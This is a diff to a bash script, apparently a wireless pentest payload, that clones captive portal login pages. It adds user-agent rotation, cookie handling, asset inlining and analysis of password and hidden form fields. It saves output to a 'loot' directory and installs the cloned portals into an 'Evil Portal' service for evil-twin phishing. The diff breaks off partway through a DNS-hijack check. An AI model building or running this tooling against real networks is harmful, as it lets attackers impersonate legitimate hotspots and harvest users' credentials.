@@ -108,7 +108,8 @@ ORIGINAL_IFACE_UP=""
 ORIGINAL_WPA_PID=""
 
 # Captive portal detection URLs (standard endpoints)
-DETECTION_URLS=(
+# HTTP endpoints (most common)
+DETECTION_URLS_HTTP=(
     "http://connectivitycheck.gstatic.com/generate_204"
     "http://www.gstatic.com/generate_204"
     "http://clients3.google.com/generate_204"
@@ -116,6 +117,124 @@ DETECTION_URLS=(
     "http://www.apple.com/library/test/success.html"
     "http://detectportal.firefox.com/success.txt"
     "http://www.msftconnecttest.com/connecttest.txt"
+)
+
+# HTTPS endpoints (for HTTPS-only portals)
+DETECTION_URLS_HTTPS=(
+    "https://www.google.com/generate_204"
+    "https://captive.apple.com/hotspot-detect.html"
+    "https://www.apple.com/library/test/success.html"
+    "https://detectportal.firefox.com/success.txt"
+)
+
+# Known DNS resolution targets for DNS hijack detection
+DNS_CHECK_DOMAINS=(
+    "www.google.com:142.250"
+    "www.apple.com:17.253"
+    "www.microsoft.com:20.70"
+)
+
+# Headless browser option (requires phantomjs or playwright)
+USE_HEADLESS_BROWSER=0
+HEADLESS_AVAILABLE=0
+HEADLESS_TOOL=""
+
+# Cookie jar for session preservation
+COOKIE_JAR="/tmp/clone_portal_cookies.txt"
+
+# User agents for rotation
+USER_AGENTS=(
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
+    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+)
+CURRENT_USER_AGENT=""
+
+# Signal strength filter (dBm, networks weaker than this are hidden)
+MIN_SIGNAL_STRENGTH=-85
+FILTER_WEAK_SIGNALS=0
+
+# Band selection (all, 2.4, 5)
+BAND_FILTER="all"
+
+# Multi-language portal detection keywords
+PORTAL_KEYWORDS_EN="login|sign.?in|connect|accept|terms|captive|portal|authenticate|wifi|password|username|email"
+PORTAL_KEYWORDS_ES="iniciar|sesion|conectar|aceptar|terminos|contraseña|usuario|correo"
+PORTAL_KEYWORDS_FR="connexion|connecter|accepter|conditions|mot.?de.?passe|utilisateur"
+PORTAL_KEYWORDS_DE="anmelden|verbinden|akzeptieren|bedingungen|passwort|benutzer"
+PORTAL_KEYWORDS_ALL="$PORTAL_KEYWORDS_EN|$PORTAL_KEYWORDS_ES|$PORTAL_KEYWORDS_FR|$PORTAL_KEYWORDS_DE"
+
+# Known portal templates for detection
+PORTAL_TEMPLATES=(
+    "cisco:Cisco Systems|cisco.com|CiscoWebAuth"
+    "aruba:Aruba Networks|arubanetworks.com|aruba_captive"
+    "meraki:Meraki|meraki.com|splash_auth"
+    "unifi:Ubiquiti|unifi.ui.com|UniFi"
+    "ruckus:Ruckus|ruckuswireless|ruckus_captive"
+    "fortinet:FortiGate|fortinet.com|fgt_redirect"
+    "paloalto:Palo Alto|paloaltonetworks|pan_captive"
+    "mikrotik:MikroTik|mikrotik.com|hotspot"
+    "openwrt:OpenWrt|openwrt.org|luci"
+    "coova:CoovaChilli|coova.org|uamip"
+)
+
+# Logging
+LOG_FILE=""
+LOG_TO_FILE=1
+
+# Rate limiting
+RATE_LIMIT_DELAY=2
+MAX_RETRIES=3
+
+# Configuration persistence
+CONFIG_FILE="/root/.clone_portal_config"
+
+# Session handling
+SESSION_CHECK_INTERVAL=30
+SESSION_LAST_CHECK=0
+
+# Response time tracking
+RESPONSE_TIMES=()
+
+# Known tracking/analytics domains to sanitize
+TRACKING_DOMAINS=(
+    "google-analytics.com"
+    "googletagmanager.com"
+    "facebook.net"
+    "doubleclick.net"
+    "hotjar.com"
+    "mixpanel.com"
+    "segment.io"
+    "amplitude.com"
+    "heap.io"
+    "fullstory.com"
+    "mouseflow.com"
+    "crazyegg.com"
+    "optimizely.com"
+    "newrelic.com"
+    "pingdom.com"
+)
+
+# API endpoint patterns
+API_PATTERNS=(
+    "/api/"
+    "/rest/"
+    "/v1/"
+    "/v2/"
+    "/auth/"
+    "/login"
+    "/authenticate"
+    "/session"
+    "/token"
+    "\.json$"
+    "XMLHttpRequest"
+    "fetch\\("
+    "axios"
+    "\\$.ajax"
+    "\\$.post"
+    "\\$.get"
 )
 
 # =============================================================================
@@ -340,6 +459,1003 @@ sanitize_ssid() {
     echo "$ssid" | tr -cs 'a-zA-Z0-9_-' '_' | sed 's/_*$//' | head -c 50
 }
 
+# Initialize logging to file
+init_logging() {
+    if [ "$LOG_TO_FILE" -eq 1 ]; then
+        local timestamp
+        timestamp=$(date +%Y%m%d_%H%M%S)
+        LOG_FILE="$LOOT_DIR/clone_${timestamp}.log"
+        mkdir -p "$LOOT_DIR"
+        echo "=== Clone Captive Portal Log ===" > "$LOG_FILE"
+        echo "Started: $(date)" >> "$LOG_FILE"
+        echo "================================" >> "$LOG_FILE"
+    fi
+}
+
+# Log message to both screen and file
+log_to_file() {
+    local msg="$1"
+    if [ "$LOG_TO_FILE" -eq 1 ] && [ -n "$LOG_FILE" ]; then
+        echo "[$(date +%H:%M:%S)] $msg" >> "$LOG_FILE" 2>/dev/null
+    fi
+}
+
+# Get random user agent
+get_random_user_agent() {
+    local count=${#USER_AGENTS[@]}
+    local idx=$((RANDOM % count))
+    CURRENT_USER_AGENT="${USER_AGENTS[$idx]}"
+    echo "$CURRENT_USER_AGENT"
+}
+
+# Rotate to next user agent
+rotate_user_agent() {
+    get_random_user_agent >/dev/null
+    log_to_file "User agent rotated: ${CURRENT_USER_AGENT:0:50}..."
+}
+
+# Make HTTP request with cookies and user agent
+http_request() {
+    local url="$1"
+    local output_file="$2"
+    local follow_redirects="${3:-1}"
+    local retries=0
+    local http_code=""
+    
+    [ -z "$CURRENT_USER_AGENT" ] && get_random_user_agent >/dev/null
+    
+    while [ $retries -lt $MAX_RETRIES ]; do
+        local curl_opts="-s -m $TIMEOUT"
+        curl_opts="$curl_opts -A \"$CURRENT_USER_AGENT\""
+        curl_opts="$curl_opts -c \"$COOKIE_JAR\" -b \"$COOKIE_JAR\""
+        
+        [ "$follow_redirects" -eq 1 ] && curl_opts="$curl_opts -L"
+        
+        if [ -n "$output_file" ]; then
+            http_code=$(eval curl $curl_opts -o "\"$output_file\"" -w "%{http_code}" "\"$url\"" 2>/dev/null)
+        else
+            http_code=$(eval curl $curl_opts -o /dev/null -w "%{http_code}" "\"$url\"" 2>/dev/null)
+        fi
+        
+        # Check for rate limiting
+        if [ "$http_code" = "429" ]; then
+            log_to_file "Rate limited (429), waiting ${RATE_LIMIT_DELAY}s..."
+            sleep $RATE_LIMIT_DELAY
+            # Cap delay at 30 seconds to avoid excessive waits
+            if [ $RATE_LIMIT_DELAY -lt 30 ]; then
+                RATE_LIMIT_DELAY=$((RATE_LIMIT_DELAY * 2))
+            fi
+            retries=$((retries + 1))
+            rotate_user_agent
+        else
+            break
+        fi
+    done
+    
+    echo "$http_code"
+}
+
+# Detect portal template from content
+detect_portal_template() {
+    local content="$1"
+    local detected=""
+    
+    for template in "${PORTAL_TEMPLATES[@]}"; do
+        local name="${template%%:*}"
+        local patterns="${template#*:}"
+        
+        if echo "$content" | grep -qiE "$patterns"; then
+            detected="$name"
+            log_to_file "Portal template detected: $name"
+            break
+        fi
+    done
+    
+    echo "$detected"
+}
+
+# Take screenshot with headless browser
+take_portal_screenshot() {
+    local url="$1"
+    local output_file="$2"
+    
+    if [ "$HEADLESS_AVAILABLE" -eq 0 ]; then
+        return 1
+    fi
+    
+    log_to_file "Taking screenshot: $url"
+    
+    case "$HEADLESS_TOOL" in
+        phantomjs)
+            cat > /tmp/phantom_screenshot.js << 'JSEOF'
+var page = require('webpage').create();
+var system = require('system');
+var url = system.args[1];
+var output = system.args[2];
+
+page.viewportSize = { width: 375, height: 667 };
+page.settings.userAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)';
+
+page.open(url, function(status) {
+    if (status === 'success') {
+        setTimeout(function() {
+            page.render(output);
+            phantom.exit(0);
+        }, 2000);
+    } else {
+        phantom.exit(1);
+    }
+});
+JSEOF
+            timeout 15 phantomjs /tmp/phantom_screenshot.js "$url" "$output_file" 2>/dev/null
+            rm -f /tmp/phantom_screenshot.js
+            ;;
+        chromium)
+            timeout 15 chromium --headless --disable-gpu --screenshot="$output_file" \
+                --window-size=375,667 "$url" 2>/dev/null
+            ;;
+    esac
+    
+    [ -f "$output_file" ]
+}
+
+# Inline external assets (CSS, JS, images) into HTML
+inline_assets() {
+    local html_file="$1"
+    local base_url="$2"
+    local temp_file="/tmp/inline_temp.html"
+    
+    log_to_file "Inlining assets for: $html_file"
+    
+    # Inline CSS files
+    while IFS= read -r css_url; do
+        [ -z "$css_url" ] && continue
+        
+        # Make URL absolute if relative
+        if [[ "$css_url" =~ ^/ ]]; then
+            css_url="${base_url}${css_url}"
+        elif [[ ! "$css_url" =~ ^https?:// ]]; then
+            css_url="${base_url}/${css_url}"
+        fi
+        
+        local css_content
+        css_content=$(curl -s -m 5 "$css_url" 2>/dev/null)
+        
+        if [ -n "$css_content" ]; then
+            # Escape for sed
+            css_content=$(echo "$css_content" | sed 's/[&/\]/\\&/g' | tr '\n' ' ')
+            sed -i "s|<link[^>]*href=[\"']${css_url}[\"'][^>]*>|<style>$css_content</style>|gi" "$html_file" 2>/dev/null
+        fi
+    done < <(grep -i "\.css" "$html_file" 2>/dev/null | sed -E 's/.*href=["\x27]([^"\x27]+\.css[^"\x27]*)["\x27].*/\1/' | grep -v "^<")
+    
+    # Inline small images as base64 (< 50KB)
+    while IFS= read -r img_url; do
+        [ -z "$img_url" ] && continue
+        
+        if [[ "$img_url" =~ ^/ ]]; then
+            img_url="${base_url}${img_url}"
+        elif [[ ! "$img_url" =~ ^https?:// ]]; then
+            img_url="${base_url}/${img_url}"
+        fi
+        
+        # Download and check size
+        local img_file="/tmp/inline_img_$$"
+        curl -s -m 5 -o "$img_file" "$img_url" 2>/dev/null
+        
+        if [ -f "$img_file" ]; then
+            local size
+            size=$(stat -f%z "$img_file" 2>/dev/null || stat -c%s "$img_file" 2>/dev/null)
+            
+            if [ "${size:-0}" -lt 51200 ]; then
+                local mime_type="image/png"
+                [[ "$img_url" =~ \.jpe?g$ ]] && mime_type="image/jpeg"
+                [[ "$img_url" =~ \.gif$ ]] && mime_type="image/gif"
+                [[ "$img_url" =~ \.svg$ ]] && mime_type="image/svg+xml"
+                
+                local base64_data
+                base64_data=$(base64 -w0 "$img_file" 2>/dev/null || base64 "$img_file" 2>/dev/null)
+                
+                if [ -n "$base64_data" ]; then
+                    sed -i "s|$img_url|data:$mime_type;base64,$base64_data|g" "$html_file" 2>/dev/null
+                fi
+            fi
+            rm -f "$img_file"
+        fi
+    done < <(grep -iE '\.(png|jpg|jpeg|gif|svg)' "$html_file" 2>/dev/null | sed -E "s/.*src=[\"']([^\"']+\.(png|jpg|jpeg|gif|svg)[^\"']*)[\"'].*/\1/" | grep -v "^<" | head -20)
+    
+    log_to_file "Asset inlining complete"
+}
+
+# Verify cloned portal renders correctly
+verify_portal() {
+    local portal_dir="$1"
+    local index_file=""
+    
+    # Find index file
+    if [ -f "$portal_dir/index.php" ]; then
+        index_file="$portal_dir/index.php"
+    elif [ -f "$portal_dir/index.html" ]; then
+        index_file="$portal_dir/index.html"
+    else
+        index_file=$(find "$portal_dir" -name "*.html" -o -name "*.php" | head -1)
+    fi
+    
+    if [ -z "$index_file" ] || [ ! -f "$index_file" ]; then
+        log_to_file "Verification failed: No index file found"
+        return 1
+    fi
+    
+    local issues=0
+    
+    # Check for essential elements
+    if ! grep -qi "<html" "$index_file"; then
+        log_to_file "Warning: Missing <html> tag"
+        issues=$((issues + 1))
+    fi
+    
+    if ! grep -qi "<body" "$index_file"; then
+        log_to_file "Warning: Missing <body> tag"
+        issues=$((issues + 1))
+    fi
+    
+    # Check for forms
+    local form_count
+    form_count=$(grep -ci "<form" "$index_file" 2>/dev/null || echo "0")
+    log_to_file "Forms found: $form_count"
+    
+    # Check for broken references
+    local broken_refs
+    broken_refs=$(grep -oP 'src=["\x27]\K[^"\x27]+' "$index_file" 2>/dev/null | while read -r ref; do
+        if [[ "$ref" =~ ^https?:// ]]; then
+            echo "$ref"
+        elif [[ "$ref" =~ ^data: ]]; then
+            continue
+        elif [ ! -f "$portal_dir/$ref" ]; then
+            echo "$ref"
+        fi
+    done | wc -l)
+    
+    log_to_file "Potentially broken references: $broken_refs"
+    
+    if [ "$issues" -eq 0 ]; then
+        log_to_file "Portal verification: PASSED"
+        return 0
+    else
+        log_to_file "Portal verification: $issues issues found"
+        return 1
+    fi
+}
+
+# Filter networks by signal strength
+filter_by_signal() {
+    local input_file="$1"
+    local output_file="$2"
+    
+    if [ "$FILTER_WEAK_SIGNALS" -eq 0 ]; then
+        cp "$input_file" "$output_file"
+        return
+    fi
+    
+    while IFS='|' read -r signal ssid bssid channel; do
+        # Signal is already in dBm (negative number)
+        if [ "${signal:--100}" -ge "$MIN_SIGNAL_STRENGTH" ]; then
+            echo "$signal|$ssid|$bssid|$channel"
+        fi
+    done < "$input_file" > "$output_file"
+    
+    log_to_file "Filtered networks: $(wc -l < "$input_file") -> $(wc -l < "$output_file")"
+}
+
+# Filter networks by band (2.4GHz or 5GHz)
+filter_by_band() {
+    local input_file="$1"
+    local output_file="$2"
+    
+    if [ "$BAND_FILTER" = "all" ]; then
+        cp "$input_file" "$output_file"
+        return
+    fi
+    
+    while IFS='|' read -r signal ssid bssid channel; do
+        local ch="${channel:-0}"
+        
+        case "$BAND_FILTER" in
+            "2.4")
+                # 2.4GHz channels: 1-14
+                if [ "$ch" -ge 1 ] && [ "$ch" -le 14 ]; then
+                    echo "$signal|$ssid|$bssid|$channel"
+                fi
+                ;;
+            "5")
+                # 5GHz channels: 36+
+                if [ "$ch" -ge 36 ]; then
+                    echo "$signal|$ssid|$bssid|$channel"
+                fi
+                ;;
+        esac
+    done < "$input_file" > "$output_file"
+    
+    log_to_file "Band filtered ($BAND_FILTER): $(wc -l < "$input_file") -> $(wc -l < "$output_file")"
+}
+
+# =============================================================================
+# V1.3 ENHANCEMENT FUNCTIONS
+# =============================================================================
+
+# Save configuration to file for persistence
+save_config() {
+    LOG "Saving configuration..."
+    cat > "$CONFIG_FILE" << EOF
+# Clone Portal Configuration - $(date)
+BAND_FILTER="$BAND_FILTER"
+FILTER_WEAK_SIGNALS=$FILTER_WEAK_SIGNALS
+MIN_SIGNAL_STRENGTH=$MIN_SIGNAL_STRENGTH
+USE_HEADLESS_BROWSER=$USE_HEADLESS_BROWSER
+CURRENT_USER_AGENT="$CURRENT_USER_AGENT"
+EOF
+    log_to_file "Configuration saved to $CONFIG_FILE"
+}
+
+# Load configuration from file
+load_config() {
+    if [ -f "$CONFIG_FILE" ]; then
+        LOG "Loading saved configuration..."
+        # shellcheck source=/dev/null
+        source "$CONFIG_FILE"
+        log_to_file "Configuration loaded from $CONFIG_FILE"
+        return 0
+    fi
+    return 1
+}
+
+# Check network connectivity (for reconnection)
+check_connectivity() {
+    local test_ip="${GATEWAY:-8.8.8.8}"
+    if ping -c1 -W2 "$test_ip" >/dev/null 2>&1; then
+        return 0
+    fi
+    return 1
+}
+
+# Auto-reconnect if connection drops
+auto_reconnect() {
+    local max_attempts=3
+    local attempt=0
+    
+    while [ $attempt -lt $max_attempts ]; do
+        if check_connectivity; then
+            return 0
+        fi
+        
+        attempt=$((attempt + 1))
+        LOG yellow "Connection lost, reconnecting (attempt $attempt/$max_attempts)..."
+        log_to_file "Reconnection attempt $attempt"
+        
+        # Try to reassociate
+        wpa_cli -p "$WPA_CTRL" -i "$INTERFACE" reassociate >/dev/null 2>&1
+        sleep 3
+        
+        # Re-obtain IP if needed
+        if ! check_connectivity; then
+            udhcpc -i "$INTERFACE" -q -n -t 3 >/dev/null 2>&1
+            sleep 2
+        fi
+    done
+    
+    LOG red "Failed to reconnect after $max_attempts attempts"
+    return 1
+}
+
+# Detect MAC-based bypass (portal whitelists after first auth)
+detect_mac_bypass() {
+    local portal_url="$1"
+    LOG "Checking for MAC-based bypass..."
+    
+    # Get our current MAC (BusyBox compatible)
+    local our_mac
+    our_mac=$(ip link show "$INTERFACE" 2>/dev/null | awk '/link\/ether/ {print $2}')
+    log_to_file "Our MAC: $our_mac"
+    
+    # Try direct internet access without portal auth
+    local direct_test
+    direct_test=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "http://www.google.com/generate_204" 2>/dev/null)
+    
+    if [ "$direct_test" = "204" ]; then
+        LOG green "  MAC appears to be whitelisted (direct internet access)"
+        log_to_file "MAC bypass detected - already whitelisted"
+        return 0
+    fi
+    
+    # Check if portal sets any MAC-related cookies
+    if [ -f "$COOKIE_JAR" ]; then
+        if grep -qiE "(mac|client|device)" "$COOKIE_JAR" 2>/dev/null; then
+            LOG yellow "  Portal uses MAC/device cookies"
+            log_to_file "MAC-related cookies found"
+        fi
+    fi
+    
+    return 1
+}
+
+# Extract SSL certificate information
+extract_ssl_cert_info() {
+    local url="$1"
+    local output_file="$2"
+    
+    # Check if openssl is available
+    if [ "$HAVE_OPENSSL" -ne 1 ]; then
+        LOG yellow "  OpenSSL not available, skipping SSL cert extraction"
+        echo "OpenSSL not available" > "$output_file"
+        return 1
+    fi
+    
+    # Extract domain from URL
+    local domain
+    domain=$(echo "$url" | sed -E 's|https?://([^/:]+).*|\1|')
+    
+    if [ -z "$domain" ]; then
+        return 1
+    fi
+    
+    LOG "Extracting SSL cert info for $domain..."
+    
+    # Get certificate details
+    local cert_info
+    cert_info=$(echo | openssl s_client -servername "$domain" -connect "$domain:443" 2>/dev/null | openssl x509 -noout -text 2>/dev/null)
+    
+    if [ -n "$cert_info" ]; then
+        local cn issuer validity
+        # Use sed instead of grep -P for BusyBox compatibility
+        cn=$(echo "$cert_info" | grep "Subject:" | sed -E 's/.*CN\s*=\s*([^,]+).*/\1/' | head -1)
+        issuer=$(echo "$cert_info" | grep "Issuer:" | sed -E 's/.*CN\s*=\s*([^,]+).*/\1/' | head -1)
+        validity=$(echo "$cert_info" | grep -A2 "Validity" | tail -2)
+        
+        cat > "$output_file" << EOF
+SSL Certificate Information
+===========================
+Domain: $domain
+Common Name (CN): $cn
+Issuer: $issuer
+$validity
+
+Full Certificate:
+$cert_info
+EOF
+        
+        LOG green "  CN: $cn"
+        LOG "  Issuer: $issuer"
+        log_to_file "SSL cert extracted: CN=$cn, Issuer=$issuer"
+        return 0
+    fi
+    
+    return 1
+}
+
+# Detect AJAX/API endpoints in JavaScript
+detect_api_endpoints() {
+    local portal_dir="$1"
+    local output_file="$2"
+    
+    LOG "Detecting API endpoints..."
+    
+    local endpoints=()
+    local js_files
+    js_files=$(find "$portal_dir" -name "*.js" -o -name "*.html" 2>/dev/null)
+    
+    for file in $js_files; do
+        # Look for API patterns
+        for pattern in "${API_PATTERNS[@]}"; do
+            local matches
+            matches=$(grep -oP "$pattern[^\"')\s]*" "$file" 2>/dev/null | sort -u)
+            for m in $matches; do
+                endpoints+=("$m")
+            done
+        done
+        
+        # Look for fetch/XHR URLs
+        grep -oP "(fetch|XMLHttpRequest\.open)[^;]*[\"']https?://[^\"']+[\"']" "$file" 2>/dev/null | \
+            grep -oP "https?://[^\"']+" >> "$output_file.urls" 2>/dev/null
+        
+        # Look for axios/jQuery AJAX
+        grep -oP "(axios\.(get|post|put)|\\$\.(ajax|get|post))[^;]*[\"'][^\"']+[\"']" "$file" 2>/dev/null | \
+            grep -oP "[\"'][^\"']+[\"']" | tr -d "\"'" >> "$output_file.urls" 2>/dev/null
+    done
+    
+    # Deduplicate and save
+    if [ -f "$output_file.urls" ]; then
+        sort -u "$output_file.urls" > "$output_file"
+        rm -f "$output_file.urls"
+        local count
+        count=$(wc -l < "$output_file")
+        LOG green "  Found $count potential API endpoints"
+        log_to_file "API endpoints detected: $count"
+    else
+        echo "No API endpoints detected" > "$output_file"
+    fi
+}
+
+# Analyze form fields for password, CSRF tokens, etc.
+analyze_form_fields() {
+    local portal_dir="$1"
+    local output_file="$2"
+    
+    LOG "Analyzing form fields..."
+    
+    cat > "$output_file" << 'EOF'
+Form Field Analysis
+===================
+EOF
+    
+    local html_files
+    html_files=$(find "$portal_dir" -name "*.html" -o -name "*.php" 2>/dev/null)
+    
+    local password_fields=0
+    local email_fields=0
+    local hidden_fields=0
+    local csrf_tokens=0
+    
+    for file in $html_files; do
+        # Password fields
+        local pw
+        pw=$(grep -ciE 'type\s*=\s*["\x27]?password' "$file" 2>/dev/null || echo 0)
+        password_fields=$((password_fields + pw))
+        
+        # Email fields
+        local em
+        em=$(grep -ciE 'type\s*=\s*["\x27]?(email|text)["\x27]?\s+.*name\s*=\s*["\x27]?(email|mail|user)' "$file" 2>/dev/null || echo 0)
+        email_fields=$((email_fields + em))
+        
+        # Hidden fields
+        local hf
+        hf=$(grep -ciE 'type\s*=\s*["\x27]?hidden' "$file" 2>/dev/null || echo 0)
+        hidden_fields=$((hidden_fields + hf))
+        
+        # CSRF tokens
+        local csrf
+        csrf=$(grep -ciE '(csrf|token|_token|authenticity)' "$file" 2>/dev/null || echo 0)
+        csrf_tokens=$((csrf_tokens + csrf))
+        
+        # Extract actual field names
+        grep -oP 'name\s*=\s*["\x27][^"\x27]+["\x27]' "$file" 2>/dev/null | \
+            sed "s/name\s*=\s*[\"']//g" | tr -d "\"'" >> "$output_file.fields"
+    done
+    
+    cat >> "$output_file" << EOF
+
+Summary:
+- Password fields: $password_fields
+- Email/username fields: $email_fields  
+- Hidden fields: $hidden_fields
+- CSRF/token references: $csrf_tokens
+
+Field Names Found:
+EOF
+    
+    if [ -f "$output_file.fields" ]; then
+        sort -u "$output_file.fields" >> "$output_file"
+        rm -f "$output_file.fields"
+    fi
+    
+    LOG "  Password fields: $password_fields, Hidden: $hidden_fields, CSRF: $csrf_tokens"
+    log_to_file "Form analysis: pw=$password_fields, hidden=$hidden_fields, csrf=$csrf_tokens"
+}
+
+# Analyze cookie expiration times
+analyze_cookies() {
+    local output_file="$1"
+    
+    LOG "Analyzing cookies..."
+    
+    if [ ! -f "$COOKIE_JAR" ]; then
+        echo "No cookies captured" > "$output_file"
+        return
+    fi
+    
+    cat > "$output_file" << 'EOF'
+Cookie Analysis
+===============
+EOF
+    
+    local now
+    now=$(date +%s)
+    
+    # Parse Netscape cookie format
+    while IFS=$'\t' read -r domain flag path secure expiry name value; do
+        # Skip comments
+        [[ "$domain" =~ ^# ]] && continue
+        [ -z "$name" ] && continue
+        
+        local exp_date="Session"
+        local exp_status=""
+        
+        if [ -n "$expiry" ] && [ "$expiry" != "0" ]; then
+            exp_date=$(date -d "@$expiry" 2>/dev/null || echo "Unknown")
+            if [ "$expiry" -lt "$now" ]; then
+                exp_status=" [EXPIRED]"
+            elif [ "$((expiry - now))" -lt 3600 ]; then
+                exp_status=" [EXPIRING SOON]"
+            fi
+        fi
+        
+        echo -e "Cookie: $name" >> "$output_file"
+        echo "  Domain: $domain" >> "$output_file"
+        echo "  Expires: $exp_date$exp_status" >> "$output_file"
+        echo "  Secure: $secure" >> "$output_file"
+        echo "" >> "$output_file"
+        
+    done < "$COOKIE_JAR"
+    
+    local count
+    count=$(grep -c "^Cookie:" "$output_file" 2>/dev/null || echo 0)
+    LOG "  Analyzed $count cookies"
+    log_to_file "Cookie analysis: $count cookies"
+}
+
+# Check session validity (detect timeout)
+check_session_valid() {
+    local portal_url="$1"
+    
+    local now
+    now=$(date +%s)
+    
+    # Don't check too frequently
+    if [ $((now - SESSION_LAST_CHECK)) -lt $SESSION_CHECK_INTERVAL ]; then
+        return 0
+    fi
+    
+    SESSION_LAST_CHECK=$now
+    
+    # Try to access portal with existing cookies
+    local response
+    response=$(curl -s -m 5 -b "$COOKIE_JAR" -c "$COOKIE_JAR" -w "%{http_code}" -o /dev/null "$portal_url" 2>/dev/null)
+    
+    # Check for session timeout indicators
+    case "$response" in
+        401|403)
+            LOG yellow "Session may have expired (HTTP $response)"
+            log_to_file "Session timeout detected: HTTP $response"
+            return 1
+            ;;
+        302|303)
+            # Check if redirecting to login
+            local redirect_url
+            redirect_url=$(curl -s -m 5 -b "$COOKIE_JAR" -w "%{redirect_url}" -o /dev/null "$portal_url" 2>/dev/null)
+            if echo "$redirect_url" | grep -qiE "(login|auth|session)"; then
+                LOG yellow "Session expired - redirecting to login"
+                log_to_file "Session timeout: redirect to $redirect_url"
+                return 1
+            fi
+            ;;
+    esac
+    
+    return 0
+}
+
+# Track response time (BusyBox compatible - seconds only)
+track_response_time() {
+    local url="$1"
+    local start_time end_time elapsed
+    
+    start_time=$(date +%s)
+    curl -s -m 10 -o /dev/null "$url" 2>/dev/null
+    end_time=$(date +%s)
+    
+    # Elapsed in seconds (BusyBox doesn't support %N)
+    elapsed=$(( (end_time - start_time) * 1000 ))
+    
+    # Store in a file instead of array (ash/dash compatible)
+    echo "$elapsed" >> "$TEMP_DIR/response_times.txt"
+    
+    log_to_file "Response time for $url: ${elapsed}ms"
+    echo "$elapsed"
+}
+
+# Get average response time (file-based for ash/dash compatibility)
+get_avg_response_time() {
+    local total=0
+    local count=0
+    
+    if [ ! -f "$TEMP_DIR/response_times.txt" ]; then
+        echo "0"
+        return
+    fi
+    
+    while read -r t; do
+        [ -z "$t" ] && continue
+        total=$((total + t))
+        count=$((count + 1))
+    done < "$TEMP_DIR/response_times.txt"
+    
+    if [ $count -eq 0 ]; then
+        echo "0"
+        return
+    fi
+    
+    echo $((total / count))
+}
+
+# Sanitize HTML - remove tracking scripts
+sanitize_html() {
+    local file="$1"
+    
+    if [ ! -f "$file" ]; then
+        return
+    fi
+    
+    log_to_file "Sanitizing: $file"
+    
+    local tmp_file="${file}.sanitized"
+    cp "$file" "$tmp_file"
+    
+    # Remove tracking domains
+    for domain in "${TRACKING_DOMAINS[@]}"; do
+        # Remove script tags with tracking domains
+        sed -i "/<script[^>]*$domain[^>]*>.*<\/script>/Id" "$tmp_file" 2>/dev/null
+        sed -i "/<script[^>]*$domain[^>]*>/,/<\/script>/d" "$tmp_file" 2>/dev/null
+        
+        # Remove img/iframe with tracking domains
+        sed -i "/<img[^>]*$domain[^>]*>/Id" "$tmp_file" 2>/dev/null
+        sed -i "/<iframe[^>]*$domain[^>]*>.*<\/iframe>/Id" "$tmp_file" 2>/dev/null
+        
+        # Remove link tags (CSS) with tracking
+        sed -i "/<link[^>]*$domain[^>]*>/Id" "$tmp_file" 2>/dev/null
+    done
+    
+    # Remove common tracking patterns
+    sed -i '/google-analytics\.com/d' "$tmp_file" 2>/dev/null
+    sed -i '/gtag\s*(/d' "$tmp_file" 2>/dev/null
+    sed -i '/fbq\s*(/d' "$tmp_file" 2>/dev/null
+    sed -i '/_gaq\.push/d' "$tmp_file" 2>/dev/null
+    
+    mv "$tmp_file" "$file"
+}
+
+# Create portal archive
+create_portal_archive() {
+    local portal_dir="$1"
+    local archive_name="$2"
+    
+    LOG "Creating portal archive..."
+    
+    local archive_path="${LOOT_DIR}/${archive_name}.tar.gz"
+    
+    if tar -czf "$archive_path" -C "$(dirname "$portal_dir")" "$(basename "$portal_dir")" 2>/dev/null; then
+        local size
+        size=$(du -h "$archive_path" | cut -f1)
+        LOG green "  Archive created: $archive_path ($size)"
+        log_to_file "Archive created: $archive_path ($size)"
+        echo "$archive_path"
+        return 0
+    fi
+    
+    LOG red "  Failed to create archive"
+    return 1
+}
+
+# Integration with goodportal_configure
+integrate_with_goodportal() {
+    local portal_dir="$1"
+    local portal_name="$2"
+    
+    LOG "Integrating with goodportal..."
+    
+    # Check if goodportal directory exists
+    local goodportal_base="/www/portals"
+    if [ ! -d "$goodportal_base" ]; then
+        mkdir -p "$goodportal_base"
+    fi
+    
+    # Create symlink or copy
+    local target_dir="$goodportal_base/$portal_name"
+    
+    if [ -d "$target_dir" ]; then
+        LOG yellow "  Portal already exists in goodportal, backing up..."
+        mv "$target_dir" "${target_dir}.bak.$(date +%s)"
+    fi
+    
+    # Copy portal to goodportal location
+    cp -r "$portal_dir" "$target_dir"
+    
+    if [ -d "$target_dir" ]; then
+        LOG green "  Portal copied to $target_dir"
+        log_to_file "Integrated with goodportal: $target_dir"
+        
+        # Check if goodportal_configure is available
+        if [ -f "/etc/init.d/evilportal" ]; then
+            LOG "  Evil Portal service available"
+            return 0
+        fi
+    fi
+    
+    return 1
+}
+
+# =============================================================================
+# ENHANCED PORTAL DETECTION FUNCTIONS
+# =============================================================================
+
+# Detect DNS hijacking (portal intercepts all DNS queries)
+detect_dns_hijack() {
+    LOG "  Checking for DNS hijack..."
+    
+    for entry in "${DNS_CHECK_DOMAINS[@]}"; do
+        local domain="${entry%%:*}"
+        local expected_prefix="${entry##*:}"
+        
+        # Resolve domain
+        local resolved
+        resolved=$(nslookup "$domain" 2>/dev/null | grep -A1 "Name:" | grep "Address" | awk '{print $2}' | head -1)
+        
+        if [ -z "$resolved" ]; then
+            # Try alternative method - use sed instead of grep -P
+            resolved=$(ping -c1 -W2 "$domain" 2>/dev/null | head -1 | sed -E 's/.*\(([0-9.]+)\).*/\1/')
+        fi
+        
+        if [ -n "$resolved" ]; then
+            # Check if resolved IP matches expected prefix
+            if [[ ! "$resolved" =~ ^$expected_prefix ]]; then
+                LOG green "    DNS hijack detected: $domain -> $resolved"
